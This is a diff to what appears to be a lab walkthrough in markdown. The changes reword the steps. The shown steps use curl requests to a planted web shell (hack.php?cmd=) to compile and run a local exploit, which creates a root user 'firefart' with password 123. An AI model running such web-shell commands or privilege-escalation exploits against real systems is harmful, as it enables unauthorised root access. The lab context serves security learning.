@@ -179,14 +179,14 @@ And set with help https://stackoverflow.com/questions/5268088/extra-backslash-wh
 LINES TERMINATED BY '\r\n'
 ESCAPED BY ''
 ```
-because lines ended with '\\' symbol and I couldn't compile file and escaped symboles conflict with each other.
+because lines ended with '\\' symbol and escaped symboles conflicted with each other, so I couldn't compile file.
 
 
-After that compile and run exploit with:
+After that - compile and run exploit with:
 ```
 curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=gcc%20-pthread%20exploit.c%20-o%20exploit%20-lcrypt"
 curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=ls" //check if it correct compile
 curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=./exploit%20123"
 ```
 
-And we have firefart user which is root. But I don't now how log in because su or su -c can't get passwd as argument
+And we have firefart user with password 123 which is root. But I don't now how log in because su or su -c can't get passwd as argument.
